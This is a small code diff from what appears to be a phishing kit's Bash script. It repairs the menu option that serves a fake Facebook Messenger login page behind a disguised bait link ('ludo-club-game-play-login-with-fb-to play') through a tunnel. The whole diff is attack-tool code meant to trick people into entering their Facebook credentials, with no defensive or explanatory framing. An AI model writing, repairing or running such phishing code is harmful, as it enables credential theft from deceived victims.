@@ -493,7 +493,8 @@ site_facebook() {
 			tunnel_menu;;
 		4 | 04)
 			website="fb_messenger"
-			mask='http://ludo-club-game-play-login-with-fb-to play;;
+			mask='http://ludo-club-game-play-login-with-fb-to play'
+			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; clear; banner_small; site_facebook; };;
